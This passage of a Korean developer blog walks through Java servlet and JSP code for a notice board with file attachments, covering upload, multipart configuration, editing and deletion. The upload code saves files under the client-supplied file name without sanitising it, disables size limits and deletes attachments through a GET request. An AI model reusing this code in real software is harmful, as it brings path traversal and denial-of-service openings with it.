-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardSave</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">charSet</span> <span class="o">=</span> <span class="s">"utf-8"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setCharacterEncoding</span><span class="o">(</span><span class="n">charSet</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">request</span><span class="o">.</span><span class="na">getContentType</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"multipart/form-data"</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">//404 에러 발생</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// application/x-www-form-urlencoded 타입이 아니라.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 오직 multipart/form-data 타입만 받는다.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
-	<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 제목 본문 DB에 저장.</span>
-	<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="nc">User</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeBoardDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">genTime</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span> <span class="c1">// 게시글 생성 시각</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">saveNotice</span><span class="o">(</span><span class="n">user</span><span class="o">,</span> <span class="n">title</span><span class="o">,</span> <span class="n">mainText</span><span class="o">,</span><span class="n">genTime</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">noticeSid</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span> <span class="c1">// db 저장 실패</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('fail');location.href='"</span><span class="o">+</span><span class="n">noticeBoardWrite</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// ***** 파일 업로드 시작 *****</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"no file"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성 또는 존재 확인</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 저장을 위한 폴더</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">genTime</span><span class="o">+</span><span class="s">"_"</span><span class="o">+</span> <span class="n">noticeSid</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// genTime + _ + noticeSID =&gt; 폴더명</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">parts</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParts</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="nl">part:</span><span class="n">parts</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"filename="</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">file</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">+</span><span class="s">"게시글 폴더 생성 함"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">count</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">listFiles</span><span class="o">().</span><span class="na">length</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="no">MAX_FILE_NUM</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"최대 파일 갯수 초과"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"퐅더 존재? =&gt; "</span><span class="o">+</span><span class="n">file</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"타입 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">));</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"크기 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSize</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"이름 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span><span class="n">part</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span> <span class="c1">// 임시파일 삭제</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"업로드 성공"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload success"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"경로 : "</span><span class="o">+</span><span class="n">uploadPath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 업로드 실패"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload fail"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// ***** 파일 업로드 end *****</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success "</span><span class="o">+</span><span class="n">noticeRe</span><span class="o">+</span><span class="s">"');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"?page=1&amp;q='&lt;/script&gt;"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-</code></pre></div></div>
-
-<h4 id="선택">선택</h4>
-<h5 id="선택-1-webxml">선택 1. web.xml</h5>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">request.getParts()</code> 를 사용하기 위해서는 임시저장 폴더를 만들어 줘야 한다.</li>
-  <li><code class="language-plaintext highlighter-rouge">file-size-threshold</code> 에 설정한 용량이 넘으면 임시저장 폴더에 저장한다는 것이다.</li>
-  <li>코드에서 실제 파일이 어디에 저장될 것인지 코딩해 줘야한다.</li>
-</ul>
-
-<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;servlet&gt;</span>
-	<span class="nt">&lt;servlet-name&gt;</span>mainpage<span class="nt">&lt;/servlet-name&gt;</span>
-	<span class="nt">&lt;servlet-class&gt;</span>com.mingyu2.happyhackingmain.MainPage<span class="nt">&lt;/servlet-class&gt;</span>
-	<span class="nt">&lt;multipart-config&gt;</span>
-		<span class="nt">&lt;location&gt;</span>/home/mq/temp<span class="nt">&lt;/location&gt;</span>
-		<span class="nt">&lt;max-file-size&gt;</span>-1<span class="nt">&lt;/max-file-size&gt;</span>
-		<span class="nt">&lt;max-request-size&gt;</span>-1<span class="nt">&lt;/max-request-size&gt;</span>
-		<span class="nt">&lt;file-size-threshold&gt;</span>1024<span class="nt">&lt;/file-size-threshold&gt;</span>
-	<span class="nt">&lt;/multipart-config&gt;</span>
-<span class="nt">&lt;/servlet&gt;</span>
-</code></pre></div></div>
-
-<h5 id="선택-2-annotation-적기">선택 2. annotation 적기.</h5>
-<ul>
-  <li>각 클래스마다 적어주어야 한다.</li>
-  <li>location 설정을 따로 안하면 자바가 지정해놓은 임시 저장소를 이용한다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@MultipartConfig</span><span class="o">(</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">location</span> <span class="o">=</span> <span class="s">"/home/mq/temp"</span><span class="o">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">maxFileSize</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">maxRequestSize</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">fileSizeThreshold</span> <span class="o">=</span> <span class="mi">1024</span>
-<span class="o">)</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-</code></pre></div></div>
-
-<p><br /></p>
-
-<h3 id="게시글-수정-및-저장--파일-삭제">게시글 수정 및 저장 &amp; 파일 삭제</h3>
-
-<h4 id="jsp-1">JSP</h4>
-<h5 id="설명-2">설명</h5>
-<ul>
-  <li>게시글 수정 상태에서 첨부파일을 다운 받을 수 있는 링크를 추가하였다.</li>
-  <li>첨부파일 삭제 버튼을 추가하였다. 삭제 버튼을 누르면 첨부파일이 바로 삭제된다.</li>
-  <li><code class="language-plaintext highlighter-rouge">fetch</code>를 이용하여 get 전송을 통해 첨부파일을 삭제하여 준다.</li>
-  <li>새로운 첨부파일을 추가하고 저장버튼을 누르면 파일은 서버에 저장된다. 하지만 한 게시글 당 파일은 최대 3개까지 저장이 가능하다.</li>
-  <li>수정 모드 이면서 첨부 파일이 있으면 첨부파일 링크 및 파일 삭제버튼이 나타난다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3c80844f-6245-48e1-b5e6-67e6e381e8fb" alt="Pasted image 20230524235849" /></li>
-</ul>
-
-<h5 id="과정-2">과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag66CM642U66eBXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOyglSDtjpjsnbTsp4Ag7J2R64u1XG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOygnOuqqSwg67O466y4IOyImOyglVxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDssqjrtoDtjIzsnbwg7IKt7KCcIOuYkOuKlCDstpTqsIBcbuyCrOyaqeyekCAtPj4g7ISc67KEIDog7IiY7KCVIOqyjOyLnOq4gCDsoIDsnqUg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyImOyglSDqsozsi5zquIAg7KCA7J6lICsg7YyM7J28IOyggOyepVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zrrLwg7KCA7J6lIOuYkOuKlCDsi6TtjKgg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<ol>
-  <li>자신이 쓴 게시글에서 수정 버튼을 클릭하여 게시글 수정 페이지로 들어간다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/659e3e4d-aef1-40c9-83e1-c5230cd25e03" alt="Pasted image 20230524235819" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/39ba0683-e00e-4e9a-8db9-347b2651e6f1" alt="Pasted image 20230524235849" /></li>
-  <li>수정 페이지에서 제목과 본문을 변경할 수 있다.</li>
-  <li>전에 올렸던 첨부파일 확인이 가능하다. 그리고 이 첨부파일을 삭제버튼을 통해 삭제도 가능하다.</li>
-  <li>새로운 파일을 추가할 수 있는 <code class="language-plaintext highlighter-rouge">파일 버튼</code>도 존재한다.</li>
-  <li>수정이 완료되면 <code class="language-plaintext highlighter-rouge">저장</code> 버튼을 눌러준다.</li>
-  <li>만약 파일 첨부개수가 3개가 넘으면 새로운 파일은 추가되지 않는다. 하지만 변화된 게시글은 저장이 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2ded71de-a9a2-42d8-bcc0-8605b0a8b859" alt="Pasted image 20230525000056" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4fbff20a-ec82-458b-9ca5-41ad8979e61a" alt="Pasted image 20230525000111" /></li>
-</ol>
-
-<h5 id="첨부파일-삭제-과정">첨부파일 삭제 과정</h5>
-<ol>
-  <li>첨부파일의 삭제 버튼을 눌러준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/607e0b3e-2009-4f79-a75f-5b41d73aed89" alt="Pasted image 20230525003215" /></li>
-  <li>javacript 코드의 fetch를 통해 첨부파일 삭제 get 요청이 보내진다.</li>
-  <li>첨부파일이 서버에서 정상적으로 삭제가 되면 json 형태로 <code class="language-plaintext highlighter-rouge">success</code> 응답을 받는다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9c5fa8bf-e0cd-4283-99fb-7e266693af5b" alt="Pasted image 20230525003139" /></li>
-  <li>성공적으로 삭제가 되면 첨부파일 링크를 테이블에서 삭제한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f06bdc2a-9285-4daa-9f03-263404290099" alt="Pasted image 20230525003233" /></li>
-</ol>
-
-<h5 id="코드--notice_writejsp--1">코드 ( notice_write.jsp )</h5>
-
-<ul>
-  <li>servlet 에서 파일이름 목록과 모드 정보를 받아온다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"com.mingyu2.happyhackingmain.Pair"</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.util.ArrayList"</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%</span>
-<span class="kt">var</span> <span class="n">mode</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Boolean</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"modifyMode"</span><span class="o">);</span>
-<span class="k">if</span><span class="o">(</span><span class="n">mode</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">mode</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
-<span class="o">}</span>
-<span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="err">&gt;&gt;</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">);</span>
-<span class="nt">%&gt;</span>
-</code></pre></div></div>
-<p><br /></p>
-<ul>
-  <li>수정 모드 &amp; 첨부파일이 하나 이상이면 다운 링크 및 삭제 버튼을 표시해 준다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">mode</span> <span class="o">&amp;&amp;</span> <span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%</span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">fileNameList</span> <span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-    <span class="nt">&lt;tr</span> <span class="na">id=</span><span class="s">'</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">'</span><span class="nt">&gt;</span>    
